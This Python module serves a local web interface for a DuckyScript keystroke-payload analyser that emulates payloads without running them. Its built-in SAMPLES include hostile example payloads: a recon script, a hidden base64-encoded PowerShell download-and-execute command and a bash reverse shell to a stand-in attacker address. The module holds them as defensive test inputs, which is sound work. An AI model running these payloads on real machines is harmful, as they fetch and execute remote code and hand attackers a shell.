"""A tiny, dependency-free web UI for the DuckyScript Behaviour Sandbox.

Built on the standard library's ``http.server`` -- paste a payload into the
browser, get back the same Markdown/JSON report as the CLI, rendered as a
themed HTML page. Nothing is executed; this just wraps :func:`duckysandbox.emulate`.
"""

from __future__ import annotations

import argparse
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

from . import html_report
from .emulator import EmulationResult, emulate
from .html_report import _h
from .report import render_json


MAX_BODY_BYTES = 1_000_000  # 1 MB cap on submitted payload text

SAMPLES: dict[str, tuple[str, str]] = {
    "recon": ("Windows Recon", "\n".join([
        "REM Basic Windows recon, appended to a text file",
        "GUI r",
        "DELAY 500",
        "STRING cmd",
        "ENTER",
        "DELAY 500",
        "STRING whoami /all >> %TEMP%\\info.txt",
        "ENTER",
        "STRING systeminfo >> %TEMP%\\info.txt",
        "ENTER",
    ]) + "\n"),
    "dropper": ("PowerShell Downloader", "\n".join([
        "REM Hidden, encoded PowerShell download-and-execute",
        "GUI r",
        "DELAY 500",
        "STRING powershell -nop -w hidden -ep bypass -enc "
        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
        "ENTER",
    ]) + "\n"),
    "revshell": ("Linux Reverse Shell", "\n".join([
        "REM Spawn a terminal and call home",
        "CTRL ALT t",
        "DELAY 1000",
        "STRING bash -i >& /dev/tcp/203.0.113.50/4444 0>&1",
        "ENTER",
    ]) + "\n"),
    "benign": ("Benign Hello World", "\n".join([
        "REM Just says hi -- should produce no findings",
        "STRING Hello from the duck!",
        "ENTER",
    ]) + "\n"),
}


def analyze_payload(text: str, target_os_choice: str) -> EmulationResult:
    target_os = target_os_choice if target_os_choice in ("windows", "macos", "linux") else None
    return emulate(text, target_os=target_os)


def render_index_page(payload_text: str = "", target_os_choice: str = "auto",
                       result_html: str = "", error: str = "") -> str:
    os_options = []
    for value, label in (("auto", "Auto-detect"), ("windows", "Windows"),
                          ("macos", "macOS"), ("linux", "Linux")):
        selected = " selected" if value == target_os_choice else ""
        os_options.append(f'<option value="{value}"{selected}>{label}</option>')

    sample_options = ['<option value="">\U0001f986 Load a sample payload…</option>']
    sample_texts = {}
    for key, (label, text) in SAMPLES.items():
        sample_options.append(f'<option value="{key}">{_h(label)}</option>')
        sample_texts[key] = text
    samples_json = json.dumps(sample_texts).replace("</", "<\\/")

    error_html = f'<p class="form-error">⚠️ {_h(error)}</p>' if error else ""

    body = f"""
<header class="app-header">
  <div class="duck-logo">\U0001f986\U0001f4bb</div>
  <h1>DuckyScript Behaviour Sandbox</h1>
  <p class="tagline">Paste a DuckyScript / Bash Bunny payload below and find out what your
  duck is about to do -- before it ever touches a keyboard.</p>
  <pre class="duck-banner">   __
&lt;(o )___
 ( ._&gt; /
  `---'</pre>
</header>
<main class="container">
  {error_html}
  <form class="duck-form" method="post" action="/analyze">
    <div class="form-row">
      <label for="sample-select">Samples:</label>
      <select id="sample-select">{''.join(sample_options)}</select>
      <label for="target_os">Target OS:</label>
      <select id="target_os" name="target_os">{''.join(os_options)}</select>
    </div>
    <textarea id="payload" name="payload" placeholder="STRING Hello, World!&#10;ENTER" spellcheck="false">{_h(payload_text)}</textarea>
    <div class="form-row">
      <button class="analyze-btn" type="submit" name="format" value="html">\U0001f50e Analyze Payload</button>
      <button type="submit" name="format" value="json">⬇️ Download JSON report</button>
    </div>
  </form>
  {result_html}
</main>
<footer class="site-footer">\U0001f986 DuckyScript Behaviour Sandbox -- static analysis only.
Nothing you paste here is ever executed.</footer>
<script>
  const DUCK_SAMPLES = {samples_json};
  document.getElementById('sample-select').addEventListener('change', function (e) {{
    const key = e.target.value;
    if (key && DUCK_SAMPLES[key]) {{
      document.getElementById('payload').value = DUCK_SAMPLES[key];
    }}
    e.target.value = '';
  }});
</script>
"""
    return html_report.page("DuckyScript Behaviour Sandbox", body)


def _not_found_page() -> str:
    body = ('<main class="container"><h1>\U0001f986 404 -- Not Found</h1>'
            '<p>This duck got lost. <a href="/">Head back to the sandbox</a>.</p></main>')
    return html_report.page("Not Found", body)


def _error_page(message: str) -> str:
    body = (f'<main class="container"><h1>\U0001f986 Error</h1><p>{_h(message)}</p>'
            '<p><a href="/">Head back to the sandbox</a>.</p></main>')
    return html_report.page("Error", body)


class RequestHandler(BaseHTTPRequestHandler):
    server_version = "DuckySandbox/0.1"

    def _respond(self, status: int, content_type: str, body: bytes,
                  extra_headers: dict[str, str] | None = None) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        for key, value in (extra_headers or {}).items():
            self.send_header(key, value)
        self.end_headers()
        self.wfile.write(body)

    def _respond_html(self, status: int, html_doc: str) -> None:
        self._respond(status, "text/html; charset=utf-8", html_doc.encode("utf-8"))

    def do_GET(self) -> None:
        path = urlparse(self.path).path
        if path == "/":
            self._respond_html(200, render_index_page())
        else:
            self._respond_html(404, _not_found_page())

    def do_POST(self) -> None:
        path = urlparse(self.path).path
        if path != "/analyze":
            self._respond_html(404, _not_found_page())
            return

        try:
            length = int(self.headers.get("Content-Length", 0))
        except (TypeError, ValueError):
            length = 0
        if length > MAX_BODY_BYTES:
            self._respond_html(413, _error_page("That payload is too large to analyze here."))
            return

        raw = self.rfile.read(length) if length else b""
        form = parse_qs(raw.decode("utf-8", errors="replace"))
        payload_text = form.get("payload", [""])[0]
        target_os_choice = form.get("target_os", ["auto"])[0]
        fmt = form.get("format", ["html"])[0]

        if not payload_text.strip():
            self._respond_html(200, render_index_page(
                payload_text, target_os_choice, error="Paste a payload before analyzing."))
            return

        result = analyze_payload(payload_text, target_os_choice)

        if fmt == "json":
            body = render_json(result, payload_name="payload").encode("utf-8")
            self._respond(200, "application/json", body,
                           {"Content-Disposition": 'attachment; filename="duckysandbox-report.json"'})
            return

        fragment = html_report.render_html_fragment(result, payload_name="payload")
        self._respond_html(200, render_index_page(payload_text, target_os_choice, result_html=fragment))


def build_server(host: str = "127.0.0.1", port: int = 8765) -> ThreadingHTTPServer:
    return ThreadingHTTPServer((host, port), RequestHandler)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="duckysandbox-web",
        description="Serve the DuckyScript Behaviour Sandbox web UI.",
    )
    parser.add_argument("--host", default="127.0.0.1", help="interface to bind (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=8765, help="port to listen on (default: 8765)")
    args = parser.parse_args(argv)

    server = build_server(args.host, args.port)
    print(f"\U0001f986 DuckyScript Behaviour Sandbox is live at "
          f"http://{args.host}:{args.port}/  (Ctrl+C to stop)")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
